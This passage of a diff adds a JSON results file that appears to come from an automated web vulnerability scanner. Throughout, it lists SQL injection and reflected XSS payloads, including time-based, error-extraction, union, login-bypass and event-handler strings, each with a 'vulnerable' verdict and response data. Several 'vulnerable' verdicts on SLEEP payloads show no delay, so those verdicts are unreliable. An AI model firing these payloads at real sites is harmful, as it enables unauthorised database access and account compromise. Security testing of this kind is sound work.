+    "vuln_type": "sqli_string",
+    "type": "SQLI_STRING",
+    "family": "time_if",
+    "payload": "' AND IF(1=1,SLEEP(5),0)-- -",
+    "vulnerable": true,
+    "reason": "mysql_error: ['you have an error in your sql syntax']",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 7429,
+      "elapsed": 0.196
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 17114,
+      "false_len": 17114,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_board_stx"
+  },
+  {
+    "point": "sqli_board_stx",
+    "vuln_type": "sqli_string",
+    "type": "SQLI_STRING",
+    "family": "error_extract",
+    "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))-- -",
+    "vulnerable": true,
+    "reason": "mysql_error: ['you have an error in your sql syntax', 'extractvalue(']",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 7450,
+      "elapsed": 0.196
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 17114,
+      "false_len": 17114,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_board_stx"
+  },
+  {
+    "point": "sqli_board_stx",
+    "vuln_type": "sqli_string",
+    "type": "SQLI_STRING",
+    "family": "error_update",
+    "payload": "' AND UPDATEXML(1,CONCAT(0x7e,version()),1)-- -",
+    "vulnerable": true,
+    "reason": "mysql_error: ['you have an error in your sql syntax', 'updatexml(']",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 7448,
+      "elapsed": 0.196
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 17114,
+      "false_len": 17114,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_board_stx"
+  },
+  {
+    "point": "sqli_board_stx",
+    "vuln_type": "sqli_string",
+    "type": "SQLI_STRING",
+    "family": "error_gtid",
+    "payload": "' AND GTID_SUBSET(CONCAT(0x7e,database()),0)-- -",
+    "vulnerable": true,
+    "reason": "mysql_error: ['you have an error in your sql syntax']",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 7449,
+      "elapsed": 0.196
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 17114,
+      "false_len": 17114,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_board_stx"
+  },
+  {
+    "point": "sqli_board_stx",
+    "vuln_type": "sqli_string",
+    "type": "SQLI_STRING",
+    "family": "union_probe",
+    "payload": "' UNION SELECT NULL,NULL,NULL-- -",
+    "vulnerable": true,
+    "reason": "mysql_error: ['you have an error in your sql syntax']",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 7512,
+      "elapsed": 0.197
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 17114,
+      "false_len": 17114,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_board_stx"
+  },
+  {
+    "point": "sqli_board_stx",
+    "vuln_type": "sqli_string",
+    "type": "SQLI_STRING",
+    "family": "boolean_blind",
+    "payload": "' AND (SELECT 1 FROM information_schema.tables LIMIT 1)='1",
+    "vulnerable": false,
+    "reason": "no_signal",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 18214,
+      "elapsed": 0.207
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 17114,
+      "false_len": 17114,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_board_stx"
+  },
+  {
+    "point": "sqli_board_stx",
+    "vuln_type": "sqli_string",
+    "type": "SQLI_STRING",
+    "family": "percent_tautology",
+    "payload": "%' OR '1'='1",
+    "vulnerable": false,
+    "reason": "no_signal",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 17934,
+      "elapsed": 0.204
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 17114,
+      "false_len": 17114,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_board_stx"
+  },
+  {
+    "point": "sqli_board_stx",
+    "vuln_type": "sqli_string",
+    "type": "SQLI_STRING",
+    "family": "percent_sleep",
+    "payload": "%' AND SLEEP(5)-- -",
+    "vulnerable": true,
+    "reason": "mysql_error: ['you have an error in your sql syntax']",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 7420,
+      "elapsed": 0.199
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 17114,
+      "false_len": 17114,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_board_stx"
+  },
+  {
+    "point": "sqli_board_sfl",
+    "vuln_type": "sqli_field",
+    "type": "SQLI_FIELD",
+    "family": "time_if_sleep",
+    "payload": "IF(1=1,SLEEP(5),wr_datetime)",
+    "vulnerable": true,
+    "reason": "mysql_error: ['unknown column']",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 7317,
+      "elapsed": 0.197
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 17850,
+      "false_len": 17036,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_board_sfl"
+  },
+  {
+    "point": "sqli_board_sfl",
+    "vuln_type": "sqli_field",
+    "type": "SQLI_FIELD",
+    "family": "time_and_sleep",
+    "payload": "wr_subject AND SLEEP(5) OR wr_subject",
+    "vulnerable": true,
+    "reason": "mysql_error: ['unknown column']",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 7346,
+      "elapsed": 0.197
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 17850,
+      "false_len": 17036,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_board_sfl"
+  },
+  {
+    "point": "sqli_board_sfl",
+    "vuln_type": "sqli_field",
+    "type": "SQLI_FIELD",
+    "family": "error_extractvalue",
+    "payload": "EXTRACTVALUE(1,CONCAT(0x7e,database()))",
+    "vulnerable": true,
+    "reason": "mysql_error: ['unknown column']",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 7335,
+      "elapsed": 0.198
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 17850,
+      "false_len": 17036,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_board_sfl"
+  },
+  {
+    "point": "sqli_board_sfl",
+    "vuln_type": "sqli_field",
+    "type": "SQLI_FIELD",
+    "family": "error_updatexml",
+    "payload": "UPDATEXML(1,CONCAT(0x7e,user()),1)",
+    "vulnerable": true,
+    "reason": "mysql_error: ['unknown column']",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 7329,
+      "elapsed": 0.198
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 17850,
+      "false_len": 17036,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_board_sfl"
+  },
+  {
+    "point": "sqli_board_sfl",
+    "vuln_type": "sqli_field",
+    "type": "SQLI_FIELD",
+    "family": "boolean_subquery",
+    "payload": "wr_subject AND (SELECT 1 FROM information_schema.tables LIMIT 1)=1",
+    "vulnerable": false,
+    "reason": "no_signal",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 18158,
+      "elapsed": 0.2
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 17850,
+      "false_len": 17036,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_board_sfl"
+  },
+  {
+    "point": "sqli_board_sfl",
+    "vuln_type": "sqli_field",
+    "type": "SQLI_FIELD",
+    "family": "stacked_sleep",
+    "payload": "1 AND (SELECT SLEEP(5))=0 AND 1",
+    "vulnerable": true,
+    "reason": "mysql_error: ['unknown column']",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 7326,
+      "elapsed": 0.201
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 17850,
+      "false_len": 17036,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_board_sfl"
+  },
+  {
+    "point": "sqli_board_sfl",
+    "vuln_type": "sqli_field",
+    "type": "SQLI_FIELD",
+    "family": "subquery_if",
+    "payload": "(SELECT IF(1=1,SLEEP(5),0))",
+    "vulnerable": true,
+    "reason": "mysql_error: ['unknown column']",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 7329,
+      "elapsed": 0.198
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 17850,
+      "false_len": 17036,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_board_sfl"
+  },
+  {
+    "point": "sqli_board_sfl",
+    "vuln_type": "sqli_field",
+    "type": "SQLI_FIELD",
+    "family": "gtid_error",
+    "payload": "GTID_SUBSET(CONCAT(0x7e,database()),0)",
+    "vulnerable": true,
+    "reason": "mysql_error: ['unknown column']",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 7351,
+      "elapsed": 0.196
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 17850,
+      "false_len": 17036,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_board_sfl"
+  },
+  {
+    "point": "sqli_board_sst",
+    "vuln_type": "sqli_orderby",
+    "type": "SQLI_ORDERBY",
+    "family": "sleep_basic",
+    "payload": "(SELECT SLEEP(5))",
+    "vulnerable": false,
+    "reason": "no_signal",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 17756,
+      "elapsed": 0.199
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 17712,
+      "false_len": 17692,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_board_sst"
+  },
+  {
+    "point": "sqli_board_sst",
+    "vuln_type": "sqli_orderby",
+    "type": "SQLI_ORDERBY",
+    "family": "sleep_append",
+    "payload": "wr_datetime,(SELECT SLEEP(5))",
+    "vulnerable": false,
+    "reason": "no_signal",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 17800,
+      "elapsed": 0.197
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 17712,
+      "false_len": 17692,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_board_sst"
+  },
+  {
+    "point": "sqli_board_sst",
+    "vuln_type": "sqli_orderby",
+    "type": "SQLI_ORDERBY",
+    "family": "sleep_if",
+    "payload": "IF(1=1,SLEEP(5),wr_datetime)",
+    "vulnerable": false,
+    "reason": "no_signal",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 17809,
+      "elapsed": 0.198
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 17712,
+      "false_len": 17692,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_board_sst"
+  },
+  {
+    "point": "sqli_board_sst",
+    "vuln_type": "sqli_orderby",
+    "type": "SQLI_ORDERBY",
+    "family": "case_bool",
+    "payload": "CASE WHEN (1=1) THEN wr_datetime ELSE wr_num END",
+    "vulnerable": false,
+    "reason": "no_signal",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 17850,
+      "elapsed": 0.197
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 17712,
+      "false_len": 17692,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_board_sst"
+  },
+  {
+    "point": "sqli_board_sst",
+    "vuln_type": "sqli_orderby",
+    "type": "SQLI_ORDERBY",
+    "family": "case_blind",
+    "payload": "CASE WHEN (ASCII(SUBSTRING(database(),1,1))>64) THEN wr_datetime ELSE wr_num END",
+    "vulnerable": false,
+    "reason": "no_signal",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 17992,
+      "elapsed": 0.2
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 17712,
+      "false_len": 17692,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_board_sst"
+  },
+  {
+    "point": "sqli_board_sst",
+    "vuln_type": "sqli_orderby",
+    "type": "SQLI_ORDERBY",
+    "family": "error_extract",
+    "payload": "EXTRACTVALUE(1,CONCAT(0x7e,database()))",
+    "vulnerable": false,
+    "reason": "no_signal",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 17847,
+      "elapsed": 0.199
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 17712,
+      "false_len": 17692,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_board_sst"
+  },
+  {
+    "point": "sqli_board_sst",
+    "vuln_type": "sqli_orderby",
+    "type": "SQLI_ORDERBY",
+    "family": "error_update",
+    "payload": "UPDATEXML(1,CONCAT(0x7e,user()),1)",
+    "vulnerable": false,
+    "reason": "no_signal",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 17840,
+      "elapsed": 0.2
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 17712,
+      "false_len": 17692,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_board_sst"
+  },
+  {
+    "point": "sqli_board_sst",
+    "vuln_type": "sqli_orderby",
+    "type": "SQLI_ORDERBY",
+    "family": "sleep_subquery",
+    "payload": "(SELECT 1 FROM (SELECT SLEEP(3))x)",
+    "vulnerable": false,
+    "reason": "no_signal",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 17820,
+      "elapsed": 0.199
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 17712,
+      "false_len": 17692,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_board_sst"
+  },
+  {
+    "point": "sqli_ajax_member",
+    "vuln_type": "sqli_login",
+    "type": "SQLI_LOGIN",
+    "family": "auth_bypass",
+    "payload": "admin'-- -",
+    "vulnerable": false,
+    "reason": "no_signal",
+    "mode": "sqli",
+    "response": {
+      "status": 404,
+      "length": 276,
+      "elapsed": 0.516
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 276,
+      "false_len": 276,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_ajax_member"
+  },
+  {
+    "point": "sqli_ajax_member",
+    "vuln_type": "sqli_login",
+    "type": "SQLI_LOGIN",
+    "family": "tautology",
+    "payload": "' OR '1'='1'-- -",
+    "vulnerable": false,
+    "reason": "no_signal",
+    "mode": "sqli",
+    "response": {
+      "status": 404,
+      "length": 276,
+      "elapsed": 0.385
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 276,
+      "false_len": 276,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_ajax_member"
+  },
+  {
+    "point": "sqli_ajax_member",
+    "vuln_type": "sqli_login",
+    "type": "SQLI_LOGIN",
+    "family": "or_bypass",
+    "payload": "admin' OR 1=1-- -",
+    "vulnerable": false,
+    "reason": "no_signal",
+    "mode": "sqli",
+    "response": {
+      "status": 404,
+      "length": 276,
+      "elapsed": 0.384
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 276,
+      "false_len": 276,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_ajax_member"
+  },
+  {
+    "point": "sqli_ajax_member",
+    "vuln_type": "sqli_login",
+    "type": "SQLI_LOGIN",
+    "family": "time_blind",
+    "payload": "admin' AND SLEEP(5)-- -",
+    "vulnerable": false,
+    "reason": "no_signal",
+    "mode": "sqli",
+    "response": {
+      "status": 404,
+      "length": 276,
+      "elapsed": 0.385
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 276,
+      "false_len": 276,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_ajax_member"
+  },
+  {
+    "point": "sqli_ajax_member",
+    "vuln_type": "sqli_login",
+    "type": "SQLI_LOGIN",
+    "family": "error_extract",
+    "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))-- -",
+    "vulnerable": false,
+    "reason": "no_signal",
+    "mode": "sqli",
+    "response": {
+      "status": 404,
+      "length": 276,
+      "elapsed": 0.383
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 276,
+      "false_len": 276,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_ajax_member"
+  },
+  {
+    "point": "sqli_ajax_member",
+    "vuln_type": "sqli_login",
+    "type": "SQLI_LOGIN",
+    "family": "tautology_simple",
+    "payload": "' OR '1'='1",
+    "vulnerable": false,
+    "reason": "no_signal",
+    "mode": "sqli",
+    "response": {
+      "status": 404,
+      "length": 276,
+      "elapsed": 0.385
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 276,
+      "false_len": 276,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_ajax_member"
+  },
+  {
+    "point": "sqli_ajax_member",
+    "vuln_type": "sqli_login",
+    "type": "SQLI_LOGIN",
+    "family": "any_tautology",
+    "payload": "anything' OR 'x'='x",
+    "vulnerable": false,
+    "reason": "no_signal",
+    "mode": "sqli",
+    "response": {
+      "status": 404,
+      "length": 276,
+      "elapsed": 0.381
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 276,
+      "false_len": 276,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_ajax_member"
+  },
+  {
+    "point": "xss_move_from_bo",
+    "vuln_type": "xss_move",
+    "type": "REFLECTED_XSS",
+    "family": "script_basic",
+    "payload": "<script>alert(1)</script>",
+    "vulnerable": false,
+    "reason": "xss_not_reflected",
+    "mode": "xss",
+    "response": {
+      "status": 200,
+      "length": 2013,
+      "elapsed": 0.394
+    },
+    "xss_context": "none",
+    "controls": {
+      "true_len": null,
+      "false_len": null,
+      "boolean_possible": false
+    },
+    "payload_source": "xss_move_from_bo"
+  },
+  {
+    "point": "xss_move_from_bo",
+    "vuln_type": "xss_move",
+    "type": "REFLECTED_XSS",
+    "family": "img_onerror",
+    "payload": "<img src=x onerror=alert(1)>",
+    "vulnerable": false,
+    "reason": "xss_not_reflected",
+    "mode": "xss",
+    "response": {
+      "status": 200,
+      "length": 2013,
+      "elapsed": 0.394
+    },
+    "xss_context": "none",
+    "controls": {
+      "true_len": null,
+      "false_len": null,
+      "boolean_possible": false
+    },
+    "payload_source": "xss_move_from_bo"
+  },
+  {
+    "point": "xss_move_from_bo",
+    "vuln_type": "xss_move",
+    "type": "REFLECTED_XSS",
+    "family": "svg_onload",
+    "payload": "<svg onload=alert(1)>",
+    "vulnerable": false,
+    "reason": "xss_not_reflected",
+    "mode": "xss",
+    "response": {
+      "status": 200,
+      "length": 2013,
+      "elapsed": 0.396
+    },
+    "xss_context": "none",
+    "controls": {
+      "true_len": null,
+      "false_len": null,
+      "boolean_possible": false
+    },
+    "payload_source": "xss_move_from_bo"
+  },
+  {
+    "point": "xss_move_from_bo",
+    "vuln_type": "xss_move",
+    "type": "REFLECTED_XSS",
+    "family": "value_breakout",
+    "payload": "\"><img src=x onerror=alert(1)>",
+    "vulnerable": false,
+    "reason": "xss_not_reflected",
+    "mode": "xss",
+    "response": {
+      "status": 200,
+      "length": 2013,
+      "elapsed": 0.393
+    },
+    "xss_context": "none",
+    "controls": {
+      "true_len": null,
+      "false_len": null,
+      "boolean_possible": false
+    },
+    "payload_source": "xss_move_from_bo"
+  },
+  {
+    "point": "xss_move_from_bo",
+    "vuln_type": "xss_move",
+    "type": "REFLECTED_XSS",
+    "family": "details_toggle",
+    "payload": "<details open ontoggle=alert(1)>",
+    "vulnerable": false,
+    "reason": "xss_not_reflected",
+    "mode": "xss",
+    "response": {
+      "status": 200,
+      "length": 2013,
+      "elapsed": 0.392
+    },
+    "xss_context": "none",
+    "controls": {
+      "true_len": null,
+      "false_len": null,
+      "boolean_possible": false
+    },
+    "payload_source": "xss_move_from_bo"
+  },
+  {
+    "point": "xss_move_from_bo",
+    "vuln_type": "xss_move",
+    "type": "REFLECTED_XSS",
+    "family": "onmouseover",
+    "payload": "\" onmouseover=alert(1) x=\"",
+    "vulnerable": false,
+    "reason": "xss_not_reflected",
+    "mode": "xss",
+    "response": {
+      "status": 200,
+      "length": 2013,
+      "elapsed": 0.394
+    },
+    "xss_context": "none",
+    "controls": {
+      "true_len": null,
+      "false_len": null,
+      "boolean_possible": false
+    },
+    "payload_source": "xss_move_from_bo"
+  },
+  {
+    "point": "xss_move_wr_id",
+    "vuln_type": "xss_move",
+    "type": "REFLECTED_XSS",
+    "family": "script_basic",
+    "payload": "<script>alert(1)</script>",
+    "vulnerable": false,
+    "reason": "xss_not_reflected",
+    "mode": "xss",
+    "response": {
+      "status": 200,
+      "length": 2013,
+      "elapsed": 0.182
+    },
+    "xss_context": "none",
+    "controls": {
+      "true_len": null,
+      "false_len": null,
+      "boolean_possible": false
+    },
+    "payload_source": "xss_move_wr_id"
+  },
+  {
+    "point": "xss_move_wr_id",
+    "vuln_type": "xss_move",
+    "type": "REFLECTED_XSS",
+    "family": "img_onerror",
+    "payload": "<img src=x onerror=alert(1)>",
+    "vulnerable": false,
+    "reason": "xss_not_reflected",
+    "mode": "xss",
+    "response": {
+      "status": 200,
+      "length": 2013,
+      "elapsed": 0.181
+    },
+    "xss_context": "none",
+    "controls": {
+      "true_len": null,
+      "false_len": null,
+      "boolean_possible": false
+    },
+    "payload_source": "xss_move_wr_id"
+  },
+  {
+    "point": "xss_move_wr_id",
+    "vuln_type": "xss_move",
+    "type": "REFLECTED_XSS",
+    "family": "svg_onload",
+    "payload": "<svg onload=alert(1)>",
+    "vulnerable": false,
+    "reason": "xss_not_reflected",
+    "mode": "xss",
+    "response": {
+      "status": 200,
+      "length": 2013,
+      "elapsed": 0.18
+    },
+    "xss_context": "none",
+    "controls": {
+      "true_len": null,
+      "false_len": null,
+      "boolean_possible": false
+    },
+    "payload_source": "xss_move_wr_id"
+  },
+  {
+    "point": "xss_move_wr_id",
+    "vuln_type": "xss_move",
+    "type": "REFLECTED_XSS",
+    "family": "value_breakout",
+    "payload": "\"><img src=x onerror=alert(1)>",
+    "vulnerable": false,
+    "reason": "xss_not_reflected",
+    "mode": "xss",
+    "response": {
+      "status": 200,
+      "length": 2013,
+      "elapsed": 0.182
+    },
+    "xss_context": "none",
+    "controls": {
+      "true_len": null,
+      "false_len": null,
+      "boolean_possible": false
+    },
+    "payload_source": "xss_move_wr_id"
+  },
+  {
+    "point": "xss_move_wr_id",
+    "vuln_type": "xss_move",
+    "type": "REFLECTED_XSS",
+    "family": "onmouseover",
+    "payload": "\" onmouseover=alert(1) x=\"",
+    "vulnerable": false,
+    "reason": "xss_not_reflected",
+    "mode": "xss",
+    "response": {
+      "status": 200,
+      "length": 2013,
+      "elapsed": 0.182
+    },
+    "xss_context": "none",
+    "controls": {
+      "true_len": null,
+      "false_len": null,
+      "boolean_possible": false
+    },
+    "payload_source": "xss_move_wr_id"
+  },
+  {
+    "point": "xss_password_url",
+    "vuln_type": "xss_url",
+    "type": "REFLECTED_XSS",
+    "family": "script_basic",
+    "payload": "<script>alert(1)</script>",
+    "vulnerable": false,
+    "reason": "xss_not_reflected",
+    "mode": "xss",
+    "response": {
+      "status": 200,
+      "length": 2038,
+      "elapsed": 0.181
+    },
+    "xss_context": "none",
+    "controls": {
+      "true_len": null,
+      "false_len": null,
+      "boolean_possible": false
+    },
+    "payload_source": "xss_password_url"
+  },
+  {
+    "point": "xss_password_url",
+    "vuln_type": "xss_url",
+    "type": "REFLECTED_XSS",
+    "family": "img_onerror",
+    "payload": "<img src=x onerror=alert(1)>",
+    "vulnerable": false,
+    "reason": "xss_not_reflected",
+    "mode": "xss",
+    "response": {
+      "status": 200,
+      "length": 2038,
+      "elapsed": 0.181
+    },
+    "xss_context": "none",
+    "controls": {
+      "true_len": null,
+      "false_len": null,
+      "boolean_possible": false
+    },
+    "payload_source": "xss_password_url"
+  },
+  {
+    "point": "xss_password_url",
+    "vuln_type": "xss_url",
+    "type": "REFLECTED_XSS",
+    "family": "svg_onload",
+    "payload": "<svg onload=alert(1)>",
+    "vulnerable": false,
+    "reason": "xss_not_reflected",
+    "mode": "xss",
+    "response": {
+      "status": 200,
+      "length": 2038,
+      "elapsed": 0.18
+    },
+    "xss_context": "none",
+    "controls": {
+      "true_len": null,
+      "false_len": null,
+      "boolean_possible": false
+    },
+    "payload_source": "xss_password_url"
+  },
+  {
+    "point": "xss_password_url",
+    "vuln_type": "xss_url",
+    "type": "REFLECTED_XSS",
+    "family": "value_breakout",
+    "payload": "\"><img src=x onerror=alert(1)>",
+    "vulnerable": false,
+    "reason": "xss_not_reflected",
+    "mode": "xss",
+    "response": {
+      "status": 200,
+      "length": 2038,
+      "elapsed": 0.182
+    },
+    "xss_context": "none",
+    "controls": {
+      "true_len": null,
+      "false_len": null,
+      "boolean_possible": false
+    },
+    "payload_source": "xss_password_url"
+  },
+  {
+    "point": "xss_password_url",
+    "vuln_type": "xss_url",
+    "type": "REFLECTED_XSS",
+    "family": "onmouseover",
+    "payload": "\" onmouseover=alert(1) x=\"",
+    "vulnerable": false,
+    "reason": "xss_not_reflected",
+    "mode": "xss",
+    "response": {
+      "status": 200,
+      "length": 2038,
+      "elapsed": 0.181
+    },
+    "xss_context": "none",
+    "controls": {
+      "true_len": null,
+      "false_len": null,
+      "boolean_possible": false
+    },
+    "payload_source": "xss_password_url"
+  },
+  {
+    "point": "xss_password_url",
+    "vuln_type": "xss_url",
+    "type": "REFLECTED_XSS",
+    "family": "javascript_uri",
+    "payload": "javascript:alert(document.domain)",
+    "vulnerable": false,
+    "reason": "xss_not_reflected",
+    "mode": "xss",
+    "response": {
+      "status": 200,
+      "length": 2038,
+      "elapsed": 0.18
+    },
+    "xss_context": "none",
+    "controls": {
+      "true_len": null,
+      "false_len": null,
+      "boolean_possible": false
+    },
+    "payload_source": "xss_password_url"
+  },
+  {
+    "point": "xss_password_url",
+    "vuln_type": "xss_url",
+    "type": "REFLECTED_XSS",
+    "family": "details_toggle",
+    "payload": "<details open ontoggle=alert(1)>",
+    "vulnerable": false,
+    "reason": "xss_not_reflected",
+    "mode": "xss",
+    "response": {
+      "status": 200,
+      "length": 2038,
+      "elapsed": 0.182
+    },
+    "xss_context": "none",
+    "controls": {
+      "true_len": null,
+      "false_len": null,
+      "boolean_possible": false
+    },
+    "payload_source": "xss_password_url"
+  },
+  {
+    "point": "xss_profile_mb",
+    "vuln_type": "xss_search",
+    "type": "REFLECTED_XSS",
+    "family": "script_basic",
+    "payload": "<script>alert(1)</script>",
+    "vulnerable": false,
+    "reason": "xss_not_reflected",
+    "mode": "xss",
+    "response": {
+      "status": 200,
+      "length": 1987,
+      "elapsed": 0.181
+    },
+    "xss_context": "none",
+    "controls": {
+      "true_len": null,
+      "false_len": null,
+      "boolean_possible": false
+    },
+    "payload_source": "xss_profile_mb"
+  },
+  {
+    "point": "xss_profile_mb",
+    "vuln_type": "xss_search",
+    "type": "REFLECTED_XSS",
+    "family": "img_onerror",
+    "payload": "<img src=x onerror=alert(1)>",
+    "vulnerable": false,
+    "reason": "xss_not_reflected",
+    "mode": "xss",
+    "response": {
+      "status": 200,
+      "length": 1987,
+      "elapsed": 0.182
+    },
+    "xss_context": "none",
+    "controls": {
+      "true_len": null,
+      "false_len": null,
+      "boolean_possible": false
+    },
+    "payload_source": "xss_profile_mb"
+  },
+  {
+    "point": "xss_profile_mb",
+    "vuln_type": "xss_search",
+    "type": "REFLECTED_XSS",
+    "family": "svg_onload",
+    "payload": "<svg onload=alert(1)>",
+    "vulnerable": false,
+    "reason": "xss_not_reflected",
+    "mode": "xss",
+    "response": {
+      "status": 200,
+      "length": 1987,
+      "elapsed": 0.182
+    },
+    "xss_context": "none",
+    "controls": {
+      "true_len": null,
+      "false_len": null,
+      "boolean_possible": false
+    },
+    "payload_source": "xss_profile_mb"
+  },
+  {
+    "point": "xss_profile_mb",
+    "vuln_type": "xss_search",
+    "type": "REFLECTED_XSS",
+    "family": "value_breakout",
+    "payload": "\"><img src=x onerror=alert(1)>",
+    "vulnerable": false,
+    "reason": "xss_not_reflected",
+    "mode": "xss",
+    "response": {
+      "status": 200,
+      "length": 1987,
+      "elapsed": 0.181
+    },
+    "xss_context": "none",
+    "controls": {
+      "true_len": null,
+      "false_len": null,
+      "boolean_possible": false
+    },
+    "payload_source": "xss_profile_mb"
+  },
+  {
+    "point": "xss_profile_mb",
+    "vuln_type": "xss_search",
+    "type": "REFLECTED_XSS",
+    "family": "onmouseover",
+    "payload": "\" onmouseover=alert(1) x=\"",
+    "vulnerable": false,
+    "reason": "xss_not_reflected",
+    "mode": "xss",
+    "response": {
+      "status": 200,
+      "length": 1987,
+      "elapsed": 0.181
+    },
+    "xss_context": "none",
+    "controls": {
+      "true_len": null,
+      "false_len": null,
+      "boolean_possible": false
+    },
+    "payload_source": "xss_profile_mb"
+  },
+  {
+    "point": "sqli_profile_mb",
+    "vuln_type": "sqli_string",
+    "type": "SQLI_STRING",
+    "family": "auth_bypass",
+    "payload": "admin'-- -",
+    "vulnerable": false,
+    "reason": "no_signal",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 1987,
+      "elapsed": 0.181
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 1987,
+      "false_len": 1987,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_profile_mb"
+  },
+  {
+    "point": "sqli_profile_mb",
+    "vuln_type": "sqli_string",
+    "type": "SQLI_STRING",
+    "family": "tautology",
+    "payload": "' OR '1'='1",
+    "vulnerable": false,
+    "reason": "no_signal",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 1987,
+      "elapsed": 0.18
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 1987,
+      "false_len": 1987,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_profile_mb"
+  },
+  {
+    "point": "sqli_profile_mb",
+    "vuln_type": "sqli_string",
+    "type": "SQLI_STRING",
+    "family": "time_sleep",
+    "payload": "' AND SLEEP(5)-- -",
+    "vulnerable": false,
+    "reason": "no_signal",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 1987,
+      "elapsed": 0.181
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 1987,
+      "false_len": 1987,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_profile_mb"
+  },
+  {
+    "point": "sqli_profile_mb",
+    "vuln_type": "sqli_string",
+    "type": "SQLI_STRING",
+    "family": "error_extract",
+    "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))-- -",
+    "vulnerable": false,
+    "reason": "no_signal",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 1987,
